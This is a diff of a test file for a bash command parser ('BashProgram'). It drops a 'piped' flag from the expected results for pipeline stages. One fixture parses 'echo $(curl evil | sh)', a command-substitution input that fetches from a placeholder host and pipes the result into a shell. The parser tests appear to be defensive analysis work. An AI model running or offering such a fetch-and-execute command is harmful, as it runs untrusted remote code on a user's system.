@@ -872,8 +872,7 @@ describe("BashProgram", () => {
     it("splits a pipeline into its commands", async () => {
       const program = await BashProgram.parse("cat f | grep b", normalizer);
       expect(program.commands()).toEqual([
-        // Non-terminal stages carry `piped` (stdout feeds the next stage).
-        { text: "cat f", piped: true },
+        { text: "cat f" },
         { text: "grep b" },
       ]);
     });
@@ -919,7 +918,7 @@ describe("BashProgram", () => {
       );
       expect(program.commands()).toEqual([
         { text: "echo $(curl evil | sh)" },
-        { text: "curl evil", context: "command_substitution", piped: true },
+        { text: "curl evil", context: "command_substitution" },
         { text: "sh", context: "command_substitution" },
       ]);
     });
